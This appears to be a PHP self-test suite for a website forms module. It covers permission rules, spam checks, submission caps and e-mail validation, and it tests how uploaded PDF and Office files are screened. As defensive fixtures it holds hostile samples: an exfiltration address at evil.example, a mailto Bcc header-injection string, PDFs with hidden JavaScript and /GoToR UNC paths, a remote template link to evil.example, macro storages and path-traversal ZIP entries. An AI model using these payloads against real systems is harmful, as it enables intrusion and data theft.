check('SECURITY: a forms.manage-only role cannot set a retention period (it deletes answers): refused as forbidden, nothing saved', !$r['ok'] && !empty($r['forbidden']) && isset($r['errors']['settings.retention_days']) && (int) FormService::find($afid)['cfg']['retention_days'] === 0, json_encode($r['errors'] ?? []));
$r = FormService::save($afid, $setCfg(['retention_days' => 1]), (int) $cur['version'], null, ['abilities' => ['can_delete' => true] + $noAbil]);
check('SECURITY: with forms.delete the same retention change is saved', $r['ok'] && (int) FormService::find($afid)['cfg']['retention_days'] === 1);
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['retention_days' => 400]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('retention: RAISING the period or autosaving the same value needs no extra permission', $r['ok'] && (int) FormService::find($afid)['cfg']['retention_days'] === 400);
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['retention_days' => 30]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('SECURITY: lowering an existing period is refused too (400 days -> 30 would delete a year of answers)', !$r['ok'] && !empty($r['forbidden']) && (int) FormService::find($afid)['cfg']['retention_days'] === 400);
$r = FormService::save($afid, $setCfg(['retention_days' => 0]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('retention: switching it off (keep forever) is never destructive', $r['ok'] && (int) FormService::find($afid)['cfg']['retention_days'] === 0);
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['notify' => ['enabled' => true, 'emails' => ['exfil@evil.example'], 'include_answers' => true]]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('SECURITY: a forms.manage-only role cannot switch on "e-mail the answers" (answers stay behind forms.submissions)', !$r['ok'] && !empty($r['forbidden']) && isset($r['errors']['settings.notify.include_answers']) && empty(FormService::find($afid)['cfg']['notify']['include_answers']), json_encode($r['errors'] ?? []));
$r = FormService::save($afid, $setCfg(['notify' => ['enabled' => true, 'emails' => ['staff-link@example.org'], 'include_answers' => false]]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('notify: recipients of the LINK-only e-mail can be changed by a manager (the mail holds no answers)', $r['ok'] && FormService::find($afid)['cfg']['notify']['emails'] === ['staff-link@example.org']);
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['notify' => ['enabled' => true, 'emails' => ['staff-link@example.org'], 'include_answers' => true]]), (int) $cur['version'], null, ['abilities' => ['can_submissions' => true] + $noAbil]);
check('notify: a holder of forms.submissions may switch the answers on', $r['ok'] && !empty(FormService::find($afid)['cfg']['notify']['include_answers']));
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['notify' => ['emails' => ['other@evil.example']]]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('SECURITY: while answers are e-mailed, a manager cannot swap the recipients either', !$r['ok'] && !empty($r['forbidden']) && isset($r['errors']['settings.notify.emails']) && FormService::find($afid)['cfg']['notify']['emails'] === ['staff-link@example.org']);
$r = FormService::save($afid, ['title' => ZZ_FORMS . ' audit 2'], (int) $cur['version'], null, ['abilities' => $noAbil]);
check('a manager can still edit everything else (title) while the sensitive settings are unchanged', $r['ok']);
$cur = FormService::find($afid);
$r = FormService::save($afid, $setCfg(['notify' => ['include_answers' => false]]), (int) $cur['version'], null, ['abilities' => $noAbil]);
check('notify: switching "e-mail the answers" OFF is allowed for a manager (it only protects data)', $r['ok'] && empty(FormService::find($afid)['cfg']['notify']['include_answers']));

// retention leaves an audit trail with counts only
$cur = FormService::find($afid);
FormService::save($afid, $setCfg(['retention_days' => 5]), (int) $cur['version'], null);
Database::insert('form_submissions', ['form_id' => $afid, 'form_version' => 1, 'answers' => '[]', 'search_text' => 'zz', 'status' => 'read', 'created_at' => date('Y-m-d H:i:s', time() - 20 * 86400)]);
Database::insert('form_submissions', ['form_id' => $afid, 'form_version' => 1, 'answers' => '[]', 'search_text' => 'zz', 'status' => 'new']);
$res = FormRetention::run($afid);
$aud = Database::one("SELECT * FROM audit_log WHERE action = 'form.retention' AND entity_type = 'form' AND entity_id = ? ORDER BY id DESC LIMIT 1", [$afid]);
check('retention: a deletion run writes a "form.retention" audit entry with the form id and the number removed (no answers)', $res['deleted'] === 1 && $aud !== null && str_contains((string) $aud['details'], '"deleted":1') && !str_contains((string) $aud['details'], 'zz'), json_encode($aud));
FormService::save($afid, $setCfg(['retention_days' => 0]), (int) FormService::find($afid)['version'], null);

// ---- spam timing: the re-rendered page keeps the ORIGINAL timestamp; no fake success for a quick resubmit
$keep = $sig(time() - 5);
$hp = \App\Core\Honeypot::field($keep);
check('honeypot: a form re-shown after an error keeps the visitor\'s ORIGINAL signed timestamp (so a quick fix-and-resend is not "too fast")', str_contains($hp, 'value="' . $keep . '"'));
$hp2 = \App\Core\Honeypot::field((time() - 5) . '.deadbeef');
check('honeypot: a forged timestamp is not reused (a new one is issued)', !str_contains($hp2, '.deadbeef'));
$old9 = $sig(time() - 9 * 3600);
$hp3 = \App\Core\Honeypot::field($old9);
check('honeypot: an expired timestamp is not reused', !str_contains($hp3, 'value="' . $old9 . '"'));
try {
    $r = FormSpam::check($mkReq(['_hp_ts' => ['x']]), $form);
    check('spam: an array posted as the timestamp is a silent token failure (no PHP warning / 500)', !$r['ok'] && $r['silent'] && $r['reason'] === 'token');
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30), 'website' => ['x']]), $form);
    check('spam: an array in the honeypot field counts as filled', !$r['ok'] && $r['silent'] && $r['reason'] === 'honeypot');
} catch (\Throwable $e) {
    check('spam: hostile array input is handled without an exception', false, $e->getMessage());
}

// ---- presets are case-insensitive for web addresses
check('pattern url: "Https://a.org" (phone auto-capitalisation) and "HTTPS://A.ORG" pass; "ftp://a.org" does not', FormDefinition::matchPattern('url', 'Https://a.org') && FormDefinition::matchPattern('url', 'HTTPS://A.ORG/x') && !FormDefinition::matchPattern('url', 'ftp://a.org'));
check('pattern no_links: "HTTP://x", "WWW.x.com" and "Https://x" are links too (no bypass by capital letters)', !FormDefinition::matchPattern('no_links', 'see HTTP://x') && !FormDefinition::matchPattern('no_links', 'WWW.x.com') && !FormDefinition::matchPattern('no_links', 'Https://x') && FormDefinition::matchPattern('no_links', 'plain words'));
check('client presets carry the case flag for forms.js', (FormDefinition::clientPatterns()['url']['flags'] ?? '') === 'i' && (FormDefinition::clientPatterns()['no_links']['flags'] ?? '') === 'i' && (FormDefinition::clientPatterns()['digits']['flags'] ?? 'x') === '');
check('pattern explanations come from the registry (default = the built-in sentence) and are editable in the admin', FormDefinition::patternHint('digits') === 'Use digits only.');
\App\Core\Content::saveMany('forms', ['pattern_hints.letters' => 'Only letters, please!']);
$msgHint = $val($mkDef([['text', 'nm', 'Name', ['validation' => ['pattern' => 'letters']]]]), ['f_fnm' => '123'])['errors']['fnm'] ?? '';
\App\Core\Content::reset('forms', 'pattern_hints.letters');
check('pattern explanation: the edited registry text appears in the visitor\'s error message and resets cleanly', $msgHint === 'Only letters, please!' && FormDefinition::patternHint('letters') === 'Use letters, spaces, hyphens and apostrophes only.', $msgHint);
// every editable registry field must be read somewhere (no "dead" fields in Admin > Pages > Forms)
$codeBlob = '';
foreach (array_merge(glob(APP_PATH . '/services/Forms/*.php') ?: [], glob(APP_PATH . '/views/web/forms/*.php') ?: [], [APP_PATH . '/controllers/Web/FormController.php', APP_PATH . '/views/web/careers/show.php', APP_PATH . '/views/web/custom/show.php', BASE_PATH . '/assets/js/forms.js']) as $codeFile) {
    $codeBlob .= (string) file_get_contents($codeFile);
}
$dead = [];
foreach (\App\Core\PageRegistry::get('forms')['sections'] as $secKey => $sec) {
    foreach ($sec['fields'] as $fieldKey => $fieldDef) {
        $short = is_array($fieldDef) ? (string) ($fieldDef['key'] ?? '') : '';
        $short = $short !== '' ? $short : (is_string($fieldKey) ? $fieldKey : '');
        $short = str_contains($short, '.') ? substr($short, (int) strrpos($short, '.') + 1) : $short;
        if ($short !== '' && !str_contains($codeBlob, "'" . $short . "'") && !str_contains($codeBlob, '"' . $short . '"') && !str_contains($codeBlob, '.' . $short) && !str_contains($codeBlob, "'" . $secKey . '.' . $short)) {
            $dead[] = $secKey . '.' . $short;
        }
    }
}
check('registry: no editable field of Admin > Pages > Forms is unused by the site', $dead === [], implode(', ', $dead));

// ---- count rule: spam does not count against max_submissions, everywhere
$cap = FormService::create(['source' => 'blank', 'title' => ZZ_FORMS . ' cap'], null)['form'];
$capId = (int) $cap['id'];
$capDef = $mkDef([['text', 'nm', 'Name', ['required' => true]]]);
FormService::save($capId, ['definition' => $capDef, 'max_submissions' => '2'], (int) $cap['version'], null);
FormService::transition($capId, 'publish');
$capForm = FormService::find($capId);
$capFid = FormDefinition::fields($capDef)[0]['id'];
$c1 = $submit(FormService::find($capId), ['f_' . $capFid => 'A']);
$c2 = $submit(FormService::find($capId), ['f_' . $capFid => 'B']);
check('max_submissions: two places taken -> the form is full for the public page and the POST pre-check', !empty($c1['ok']) && !empty($c2['ok']) && FormService::availability(FormService::find($capId))['state'] === 'full');
SubmissionService::bulkStatus($capId, [(int) $c1['id'], (int) $c2['id']], 'spam');
check('max_submissions: marking both as spam frees the places at once (counter excludes spam; availability follows)', (int) FormService::find($capId)['submissions_count'] === 0 && FormService::availability(FormService::find($capId))['state'] === 'open' && FormService::availability(FormService::find($capId))['remaining'] === 2);
$c3 = $submit(FormService::find($capId), ['f_' . $capFid => 'C']);
check('max_submissions: a real submission is accepted again after the junk was marked as spam', !empty($c3['ok']));
SubmissionService::setStatus($capId, (int) $c1['id'], 'read');
check('max_submissions: un-marking spam takes the place back (setStatus recounts too)', (int) FormService::find($capId)['submissions_count'] === 2 && FormService::availability(FormService::find($capId))['state'] === 'full', (string) FormService::find($capId)['submissions_count']);
check('recount(): submissions_count = rows that are not spam', SubmissionService::recount($capId) === (int) Database::value("SELECT COUNT(*) FROM form_submissions WHERE form_id = ? AND status <> 'spam'", [$capId]));

// ---- shortcode: a form closed by status shows the closed notice (not nothing)
FormService::save($capId, ['max_submissions' => ''], (int) FormService::find($capId)['version'], null);
$embed = FormShortcode::render($capForm['slug']);
check('shortcode: an open form renders its embed', str_contains($embed, 'data-lf-embed'));
FormService::transition($capId, 'close');
$embed = FormShortcode::render($capForm['slug']);
check('shortcode: a form closed BY STATUS shows the editable "closed" notice, like one closed by date', str_contains($embed, 'lf-card--notice') && str_contains($embed, FormText::get('state.closed_title')), substr($embed, 0, 160));
FormService::transition($capId, 'unpublish');
check('shortcode: a draft form still renders nothing', FormShortcode::render($capForm['slug']) === '');

// ---- mail: the confirmation limit works per MAILBOX
check('canonical mailbox: +tags are dropped, Gmail dots too (googlemail = gmail), other providers keep their dots', FormMailer::canonicalAddress('Vic.Tim+spam@GMAIL.com') === 'victim@gmail.com' && FormMailer::canonicalAddress('v.ictim@googlemail.com') === 'victim@gmail.com' && FormMailer::canonicalAddress('first.last+x@example.org') === 'first.last@example.org' && FormMailer::canonicalAddress('+odd@example.org') === '+odd@example.org');
\App\Core\RateLimit::clear('forms:confirm:addr:' . hash('sha256', 'zzplus@example.org'));
$pl = [];
foreach (['a', 'b', 'c', 'd', 'e'] as $tag) {
    $pl[] = FormMailer::confirmSubmitter($formMail, 6000, $sn, 'zzplus+' . $tag . '@example.org')['sent'];
}
\App\Core\RateLimit::clear('forms:confirm:addr:' . hash('sha256', 'zzplus@example.org'));
check('SECURITY: name+a@, name+b@ ... are ONE mailbox for the "3 confirmations per hour" limit (no mail-bombing with plus-tags)', $pl === [true, true, true, false, false], json_encode($pl));

// ---- e-mail answers are "plain" (no mailto: header injection, no IP literal)
check('plainEmail(): ordinary addresses pass, "x?bcc=a@b.example", "x&cc=a@b.example", "x@[127.0.0.1]" and quoted local parts do not', FormValidator::plainEmail('amina.okello+forms@example.org') && FormValidator::plainEmail("o'brien@example.org") && !FormValidator::plainEmail('x?bcc=attacker@evil.example') && !FormValidator::plainEmail('x&cc=a@b.example') && !FormValidator::plainEmail('x@[127.0.0.1]') && !FormValidator::plainEmail('"a b"@example.org'));
$r = $val($mkDef([['email', 'em', 'Mail']]), ['f_fem' => 'x?bcc=attacker@evil.example']);
check('validator: an e-mail question refuses an address with ? = & in it (it would become a Bcc in the admin mailto link)', !$r['ok'] && isset($r['errors']['fem']));

// ---- hostile names that exist on every JavaScript object
$n = FormDefinition::normalise(['pages' => [['fields' => [['id' => 'constructor', 'type' => 'text', 'label' => 'A'], ['type' => 'select', 'label' => 'B', 'options' => [['value' => '__proto__', 'label' => 'x'], ['value' => 'toString', 'label' => 'y'], ['label' => 'constructor'], ['value' => 'ok-1', 'label' => 'z']]]]]]]);
$fl = $n['definition']['pages'][0]['fields'];
$vals = array_column($fl[1]['options'], 'value');
check('ids and option values named like Object.prototype members ("constructor", "__proto__", "toString") are replaced (forms.js keys plain objects by them)', $fl[0]['id'] !== 'constructor' && !array_filter($vals, static fn($v) => FormDefinition::isReservedName((string) $v)) && in_array('ok-1', $vals, true) && count(array_unique($vals)) === count($vals), json_encode([$fl[0]['id'], $vals]));

// ---- file contents: PDFs with hidden JavaScript, remote targets, embedded files
$pdfInject = static function (string $objects) use ($pdfBytes): string {
    $b = $pdfBytes('Cv');
    return str_replace("xref\n", $objects . "xref\n", $b);
};
$objStm = static function (string $inner, string $dictExtra = '/Filter /FlateDecode', bool $deflate = true) {
    $z = $deflate ? gzcompress($inner) : $inner;
    return "6 0 obj\n<< /Type /ObjStm /N 1 /First 4 " . $dictExtra . ' /Length ' . strlen($z) . " >>\nstream\n" . $z . "\nendstream\nendobj\n";
};
$strictOk = static function (string $bytes) use ($mkTmp): bool {
    try {
        \App\Core\PdfValidator::inspect($mkTmp($bytes), 5 * 1048576, true);
        return true;
    } catch (UploadException) {
        return false;
    }
};
$looseOk = static function (string $bytes) use ($mkTmp): bool {
    try {
        \App\Core\PdfValidator::inspect($mkTmp($bytes), 5 * 1048576);
        return true;
    } catch (UploadException) {
        return false;
    }
};
check('PDF strict: a plain, harmless PDF passes', $strictOk($pdfBytes('Plain')));
$js = $pdfInject($objStm('5 0 <</S/JavaScript/JS(app.alert(1))>>'));
check('PDF strict: JavaScript hidden in a compressed object stream (FlateDecode /ObjStm) is found and refused', !$strictOk($js));
check('PDF default mode keeps its documented limit (admin-only uploads): the same file passes there, which is why forms use strict mode', $looseOk($js));
check('PDF strict: a harmless compressed object stream passes', $strictOk($pdfInject($objStm('5 0 <</Type/Foo/Bar 1>>'))));
check('PDF strict: an object stream with an unknown filter / a predictor / garbage that does not inflate is refused (cannot be proven harmless)', !$strictOk($pdfInject($objStm('abc', '/Filter /ASCIIHexDecode', false))) && !$strictOk($pdfInject($objStm('5 0 <<>>', '/Filter /FlateDecode /DecodeParms << /Predictor 12 >>'))) && !$strictOk($pdfInject($objStm('not zlib data', '/Filter /FlateDecode', false))));
check('PDF strict: a #-escaped name in the object-stream dictionary does not hide it', !$strictOk($pdfInject(str_replace('/ObjStm', '/Obj#53tm', $objStm('5 0 <</S/Java#53cript/JS(x)>>')))));
$cat = static fn(string $extra): string => str_replace('/Type /Catalog', '/Type /Catalog ' . $extra, $pdfBytes('X'));
check('PDF strict: /GoToR (remote file, NTLM leak), embedded files, XFA, rich media and an /OpenAction URI are refused', !$strictOk($cat('/OpenAction << /S /GoToR /F (\\\\\\\\evil\\\\share\\\\x.pdf) >>')) && !$strictOk($cat('/Names << /EmbeddedFiles << /Names [(a.exe) 9 0 R] >> >>')) && !$strictOk($cat('/AcroForm << /XFA [(x) 9 0 R] >>')) && !$strictOk($cat('/OpenAction << /S /URI /URI (http://evil.example/) >>')) && !$strictOk($cat('/Extra << /Subtype /RichMedia >>')));
check('PDF strict: ordinary link annotations (/S /URI inside /A) still pass - a CV with a LinkedIn link is not refused', $strictOk($cat('/Annots2 << /A << /S /URI /URI (https://example.org) >> >>')));
$pdfFd = $mkDef([['file', 'cv2', 'CV', ['file' => ['types' => ['pdf'], 'max_mb' => 1, 'max_files' => 1]]]]);
$r = $val($pdfFd, [], ['fcv2' => [$upload($mkTmp($js), 'cv.pdf')]]);
check('form upload: the PDF with JavaScript inside an object stream is refused through the real upload path', !$r['ok'] && isset($r['errors']['fcv2']) && $r['files'] === []);

// ---- Office files: macros and fake packages
$ctDocx = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>';
$ctXlsx = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>';
$docx = static fn(array $extra = [], ?string $ct = null): string => $zipParts(['[Content_Types].xml' => $ct ?? $ctDocx, 'word/document.xml' => '<w:document/>'] + $extra, ['[Content_Types].xml']);
$oz = static fn(string $bytes, string $ext): ?string => \App\Services\Forms\OfficeInspector::zip($mkTmp($bytes), $ext);
check('Office ZIP: a real minimal .docx and .xlsx pass (stored and deflated parts)', $oz($docx(), 'docx') === null && $oz($zipParts(['[Content_Types].xml' => $ctXlsx, 'xl/workbook.xml' => '<workbook/>']), 'xlsx') === null, json_encode([$oz($docx(), 'docx'), $oz($zipParts(['[Content_Types].xml' => $ctXlsx, 'xl/workbook.xml' => '<workbook/>']), 'xlsx')]));
check('SECURITY: "PK\\x03\\x04word/document.xml" + padding (not a ZIP at all) is refused as a .docx', $oz("PK\x03\x04word/document.xml" . str_repeat('x', 100), 'docx') !== null);
check('SECURITY: a .docx with vbaProject.bin anywhere, ActiveX, embedded OLE objects or an executable part is refused', $oz($docx(['word/vbaProject.bin' => 'x']), 'docx') !== null && $oz($docx(['word/activeX/activeX1.xml' => 'x']), 'docx') !== null && $oz($docx(['word/embeddings/oleObject1.bin' => 'x']), 'docx') !== null && $oz($docx(['word/helper.exe' => 'MZ']), 'docx') !== null);
check('SECURITY: a macro-enabled package renamed to .docx (macroEnabled content type) is refused', $oz($docx([], str_replace('document.main+xml', 'document.macroEnabled.main+xml', $ctDocx)), 'docx') !== null);
check('Office ZIP: a .docx that is really a workbook (xl/workbook.xml) or has no content-types part is refused', $oz($docx(['xl/workbook.xml' => '<x/>']), 'docx') !== null && $oz($zipParts(['word/document.xml' => '<w:document/>']), 'docx') !== null);
check('Office ZIP: path tricks (../, absolute, backslash) and a damaged central directory are refused', $oz($docx(['../evil.txt' => 'x']), 'docx') !== null && $oz($docx(['/abs.txt' => 'x']), 'docx') !== null && $oz($docx(['a\\b.txt' => 'x']), 'docx') !== null && $oz(substr($docx(), 0, -10), 'docx') !== null);
$relsExt = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>';
$relsLink = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org" TargetMode="External"/></Relationships>';
check('SECURITY: a remote template / linked object relationship is refused; an ordinary hyperlink is fine', $oz($docx(['word/_rels/settings.xml.rels' => $relsExt]), 'docx') !== null && $oz($docx(['word/_rels/document.xml.rels' => $relsLink]), 'docx') === null);
// OLE (.doc / .xls)
$ole = static function (string $kind, array $dirExtra = [], int $sheetType = 0): string {
    $u16 = static fn(string $s): string => str_pad((string) mb_convert_encoding($s, 'UTF-16LE', 'UTF-8') . "\0\0", 64, "\0");
    $entry = static fn(string $name, int $type, int $start, int $size): string => $u16($name) . pack('v', (mb_strlen($name) + 1) * 2) . chr($type) . chr(1) . pack('V', 0xFFFFFFFF) . pack('V', 0xFFFFFFFF) . pack('V', 0xFFFFFFFF) . str_repeat("\0", 16) . pack('V', 0) . str_repeat("\0", 16) . pack('V', $start) . pack('V', $size) . pack('V', 0);
    $hdr = "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" . str_repeat("\0", 16) . pack('v', 0x3E) . pack('v', 3) . pack('v', 0xFFFE) . pack('v', 9) . pack('v', 6) . str_repeat("\0", 6)
        . pack('V', 0) . pack('V', 1) . pack('V', 1) . pack('V', 0) . pack('V', 4096) . pack('V', 0xFFFFFFFE) . pack('V', 0) . pack('V', 0xFFFFFFFE) . pack('V', 0) . pack('V', 0) . str_repeat(pack('V', 0xFFFFFFFF), 108);
    $fat = pack('V', 0xFFFFFFFD) . pack('V', 0xFFFFFFFE);
    for ($i = 2; $i < 9; $i++) {
        $fat .= pack('V', $i + 1);
    }
    $fat .= pack('V', 0xFFFFFFFE) . str_repeat(pack('V', 0xFFFFFFFF), 128 - 10);
    $dir = $entry('Root Entry', 5, 0xFFFFFFFE, 0) . $entry($kind === 'doc' ? 'WordDocument' : 'Workbook', 2, 2, 4096);
    foreach ($dirExtra as $name) {
        $dir .= $entry($name, 1, 0, 0);
    }
    $dir = str_pad($dir, 512, "\0");
    $stream = $kind === 'doc' ? str_repeat('W', 4096)
        : pack('vv', 0x0809, 8) . str_repeat("\0", 8) . pack('vv', 0x0085, 10) . pack('V', 0) . chr(0) . chr($sheetType) . chr(2) . chr(0) . 'S1' . pack('vv', 0x000A, 0);
    return $hdr . $fat . $dir . str_pad($stream, 4096, "\0");
};
$oo = static fn(string $bytes, string $ext): ?string => \App\Services\Forms\OfficeInspector::ole($mkTmp($bytes), $ext);
check('Office OLE: a clean .doc and a clean .xls (worksheet) pass', $oo($ole('doc'), 'doc') === null && $oo($ole('xls'), 'xls') === null, json_encode([$oo($ole('doc'), 'doc'), $oo($ole('xls'), 'xls')]));
check('SECURITY: a .doc / .xls with a Macros or VBA storage is refused', $oo($ole('doc', ['Macros']), 'doc') !== null && $oo($ole('xls', ['_VBA_PROJECT_CUR']), 'xls') !== null && $oo($ole('doc', ['VBA']), 'doc') !== null);
check('SECURITY: embedded objects (ObjectPool) are refused', $oo($ole('doc', ['ObjectPool']), 'doc') !== null);
check('SECURITY: an .xls that declares an Excel 4.0 MACRO sheet (BOUNDSHEET type 1) or a VBA module sheet (6) is refused', $oo($ole('xls', [], 1), 'xls') !== null && $oo($ole('xls', [], 6), 'xls') !== null);
check('Office OLE: random bytes with the OLE signature, a doc renamed to xls (no Workbook stream), a truncated file and a ZIP are refused', $oo("\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1" . str_repeat("\x00", 2000), 'doc') !== null && $oo($ole('doc'), 'xls') !== null && $oo(substr($ole('doc'), 0, 700), 'doc') !== null && $oo($docx(), 'doc') !== null);
$offFd = $mkDef([['file', 'off', 'Doc', ['file' => ['types' => ['docx', 'doc', 'xls', 'xlsx'], 'max_mb' => 1, 'max_files' => 1]]]]);
foreach ([['macro.doc', $ole('doc', ['Macros'])], ['macro.xls', $ole('xls', ['VBA'])], ['fake.docx', "PK\x03\x04word/document.xml" . str_repeat('x', 100)], ['macro.docx', $docx(['word/vbaProject.bin' => 'x'])]] as [$nm, $bytes]) {
    $r = $val($offFd, [], ['foff' => [$upload($mkTmp($bytes), $nm)]]);
    check('form upload refused through the real upload path: ' . $nm, !$r['ok'] && isset($r['errors']['foff']) && $r['files'] === []);
}
foreach ([['letter.docx', $docx()], ['old.doc', $ole('doc')], ['sheet.xls', $ole('xls')]] as [$nm, $bytes]) {
    $r = $val($offFd, [], ['foff' => [$upload($mkTmp($bytes), $nm)]]);
    check('form upload accepted through the real upload path: ' . $nm, $r['ok'], json_encode($r['errors']));
}

echo "Forms: public sitemap and privacy\n";
$map = \App\Services\Web\SitemapBuilder::xml();
check('sitemap: no submission, no file, no admin URL; forms listed only when published + listed + indexable', !str_contains($map, '/admin') && !str_contains($map, 'submissions') && !str_contains($map, 'thanks'));

// ================================================================================================================================ part 2: HTTP
$formsHttp = __DIR__ . '/selftest-forms-http.php';
if (is_file($formsHttp)) {
    require $formsHttp;
}

$zzCleanup();
if (!empty($standalone)) {
    echo $fail === 0 ? "\nALL CHECKS PASSED\n" : "\n{$fail} CHECK(S) FAILED\n";
    exit($fail === 0 ? 0 : 1);
}
